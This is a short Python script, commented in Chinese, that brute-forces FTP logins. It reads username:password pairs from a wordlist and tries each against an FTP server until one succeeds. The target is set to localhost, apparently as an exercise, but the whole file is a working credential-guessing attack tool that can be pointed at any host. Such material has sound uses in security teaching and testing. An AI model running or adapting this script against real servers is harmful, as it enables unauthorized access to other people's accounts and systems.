#!/usr/bin/python
# coding=utf-8
import ftplib


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r') #读取字典文件，格式为 user:password 每行
    for line in pF.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n') #分割出用户名和密码
        print('[+] Trying: ' + username + '/' + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)#尝试登陆
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + username + '/' + password)
            ftp.quit()
            return (username, password)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)


host = '127.0.0.1'
passwdFile = 'wordlist.txt'
bruteLogin(host, passwdFile)